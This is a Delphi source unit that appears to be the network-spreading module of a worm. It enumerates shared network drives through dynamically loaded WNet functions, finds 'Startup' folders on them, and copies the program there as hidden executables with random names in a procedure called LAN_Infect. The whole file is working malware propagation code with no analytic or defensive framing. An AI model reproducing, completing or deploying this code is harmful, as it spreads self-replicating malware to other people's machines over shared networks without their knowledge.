UNIT LAN;

INTERFACE

USES
  Utils,AclUtils;

PROCEDURE RunThread;

VAR
  ChildNode : STRING;
  hThread   : THandle;
  ThreadId  : LongWord;

IMPLEMENTATION

TYPE
  PNetResourceA =^TNETRESOURCEA;

  TNETRESOURCEA = RECORD
    dwScope       : DWORD;
    dwType        : DWORD;
    dwDisplayType : DWORD;
    dwUsage       : DWORD;
    lpLocalName   : pChar;
    lpRemoteName  : pChar;
    lpComment     : pChar;
    lpProvider    : pChar;
  END;

VAR
  Error                  : BYTE;
  NetworkDrivers         : ARRAY [0..3000] OF STRING;
  NumberOfNetworkDrivers : WORD;
  WNetOpenEnum           : FUNCTION(dwScope,dwType,dwUsage:DWORD;lpNetResource:PNetResourceA; VAR lpEnum:DWORD) : DWORD; STDCALL;
  WNetEnumResource       : FUNCTION(hEnum:DWORD;VARlpCount:DWORD;lpBuffer:Pointer;VAR lpBufferSize:DWORD) : DWORD; STDCALL;
  WNetCloseEnum          : FUNCTION(VAR lpEnum:DWORD) : DWORD; STDCALL;

CONST
  RESOURCEUSAGE_CONNECTABLE = 1;
  RESOURCEDISPLAYTYPE_SHARE = 3;
  ERROR_NO_MORE_ITEMS       = 259;
  RESOURCE_GLOBALNET        = 2;
  RESOURCETYPE_DISK         = 1;
  RESOURCETYPE_ANY          = 0;
  ERROR_MORE_DATA           = 234;
  NO_ERROR                  = 0;
  FILE_ATTRIBUTE_HIDDEN     = 2;

{$I Resources\TLAN.INI}

FUNCTION LAN_RandomFileName : STRING;
  VAR
  S              : STRING;
  FileNameLength : BYTE;
BEGIN
  FileNameLength:=Random(10)+5;
  REPEAT
    S:=S+Chars[Random(61)+1];
  UNTIL Length(S)=FileNameLength;
  RESULT:=S+'.exe';
END;

PROCEDURE LAN_CopyFiles(Hide:BOOL;DestinationFile:STRING);
BEGIN
  CopyFiles(False,DestinationFile);
  IF Hide then SetFileAttributes(pChar(DestinationFile),FILE_ATTRIBUTE_HIDDEN);
END;

PROCEDURE LAN_Search(Path,fSpec:STRING);
VAR
  D : TSearchRec;
BEGIN
  Error:=FindFirst(PCHAR(Path+fSpec),faAnyfile,D);
  WHILE Error=0 DO BEGIN
    LAN_CopyFiles(True,Path+fspec+'\'+LAN_RandomFileName);
    Error:=FindNext(D);
  END;
  Error:=FindFirst(Path+'*.*',faAnyfile,D);
  WHILE Error=0 DO BEGIN
    IF (D.Attr AND faDirectory = faDirectory)AND(D.Name[1]<>'.') THEN LAN_Search(Path+D.Name+'\',fSpec);
    Error:=FindNext(D);
  END;
END;

PROCEDURE LAN_Infect;
VAR
  I : DWORD;
BEGIN
  IF NumberOfNetworkDrivers>0 THEN FOR I:=0 TO NumberOfNetworkDrivers-1 DO LAN_Search(NetworkDrivers[I]+'\','Startup');
END;

PROCEDURE LoadNetNode(NetNode:PNetResourceA);
VAR
  hEnum   : Cardinal;
  Count   : DWORD;
  BufSize : DWORD;
  NR      : PNetResourceA;
  Buf     : PNetResourceA;
  R       : Integer;
BEGIN
  IF WNetOpenEnum(RESOURCE_GLOBALNET,RESOURCETYPE_ANY,0,NetNode,hEnum)<>NO_ERROR THEN Exit;
  BufSize:=$1;
  GetMem(Buf,BufSize);
  TRY
    WHILE True DO BEGIN
      Count:=$FFFFFFFF;                                                         // I wish to read ALL items
      R:=WNetEnumResource(hEnum,Count,Buf,BufSize);
      IF R=ERROR_MORE_DATA THEN BEGIN                                           // Oops ! The InitialSize is too small !
        Count:=$FFFFFFFF;                                                       // I wish to read ALL items
        FreeMem(Buf);
        GetMem(Buf,BufSize);
        R:=WNetEnumResource(hEnum,Count,Buf,BufSize);
      END;
      IF R=ERROR_NO_MORE_ITEMS THEN Break;                                      // All items are processed
      NR:=Buf;
      WHILE Count>0 DO BEGIN
        IF NR.lpRemoteName<>NIL THEN ChildNode:=STRING(NR.lpRemoteName) ELSE ChildNode:='';
        IF ((NR.dwUsage AND RESOURCEUSAGE_CONNECTABLE)<>0) AND
           (NR.dwType=RESOURCETYPE_DISK)AND                                     //Check only Disks
           (NR.dwDisplayType=RESOURCEDISPLAYTYPE_SHARE)AND                      //Check shared resources
           (Pos('CD Drive',ChildNode)=0)AND                                     //Do not check CD Drives
           (Copy(ChildNode,Length(ChildNode)-1,Length(ChildNode))<>'\A')AND     //Do not check A floppy drive
           (Copy(ChildNode,Length(ChildNode)-1,Length(ChildNode))<>'\B')AND     //Do not check B floppy drive
           (NumberOfNetworkDrivers<3000)
           THEN BEGIN
             NetworkDrivers[NumberOfNetworkDrivers]:=ChildNode;
             Inc(NumberOfNetworkDrivers);
           END;
        LoadNetNode(NR);
        INC(NR);
        DEC(Count);
      END;
    END;
    FINALLY
    WNetCloseEnum(hEnum);                                                       // Close handle
    FreeMem(Buf);                                                               // Free memory
  END;
END;

PROCEDURE RunThread;
BEGIN
  GetAddr('mpr',TLAN);
  WNetOpenEnum:=pDllProcesses[1];
  WNetEnumResource:=pDllProcesses[2];
  WNetCloseEnum:=pDllProcesses[3];

  NumberOfNetworkDrivers:=0;
  LoadNetNode(NIL);
  LAN_Infect;
END;

END.
